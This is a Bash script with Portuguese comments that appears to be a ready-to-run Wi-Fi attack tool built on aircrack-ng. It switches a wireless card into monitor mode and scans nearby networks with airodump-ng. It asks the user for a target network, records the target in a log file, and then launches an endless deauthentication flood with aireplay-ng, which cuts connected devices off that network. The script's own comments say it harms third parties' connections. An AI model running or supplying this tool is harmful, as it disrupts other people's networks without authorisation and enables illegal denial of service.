#!/usr/bin/env bash

#Ferramenta prejudicial a conexão de rede de terceiros.
#Tenha consciência de seus atos.
#Lembre-se com grandes poderes vem grandes responsabilidades.....
#Criando em KALI LINUX 2021 ZSH
#DISTRIBUIDO POR: UZICODE (C)
#BASEADO EM: AIRCRACK
log="/root/target.txt"

red="\e[31;1m"
green="\e[32;1m"
cor="\e[m"

timer(){
a=5

while sleep 0.3s; do
echo -n "$a "
let a--
[[ $a -eq 0 ]] && { clear ; break ;}
done

}



echo -e "${red}`cat skull.txt` ${cor}"
timer ; echo -n -e "${green}\tIniciando " ; sleep 5s ; clear


#=========Verificando nome da placa======================================



#=========ENTRANDO EM MODO MONITOR=======================================
read -p $'\e[31;1m\tInterface da rede:\e[m' mon
airmon-ng start ${mon}
if ifconfig | grep 'mon'
then
	mon="${mon}mon"
fi
#========Iniciando ataque=================================================
sleep 2s
echo -e "${red}\tListando redes... Use CTRL+C para parar a listagem e escolher um alvo.${cor}"
sleep 2s
airodump-ng $mon

read -p $'\e[31;1m\tBSSID: \e[m' _bssid
read -p $'\e[31;1m\tCanal: \e[m' _canal
read -p $'\e[31;1m\tESSID: \e[m' _essid

echo -e "${red}\tExbindo dispositivos conectados nessa rede, para continuar use CTRL+C${cor}"
sleep 1s
airodump-ng --bssid $_bssid -c $_canal $mon
sleep 1s
clear

#===============================================================================
cat >> $log <<EOF
===ATAQUE EFETUADO EM: $(date +%d/%m/%Y) $(date +%H:%M) por: $USER =======
ALVO: $_bssid
CANAL: $_canal
NOME: $_essid
=========================================================

EOF
#================================================================================


echo -e "${red}\tIniciando ataque a rede: ${_bssid}/${_canal}\npara interromper o ataque use CTRL+C... 		Registro salvo em ${log}	${cor}"
sleep 4s ; clear
aireplay-ng -a $_bssid -0 0 $mon

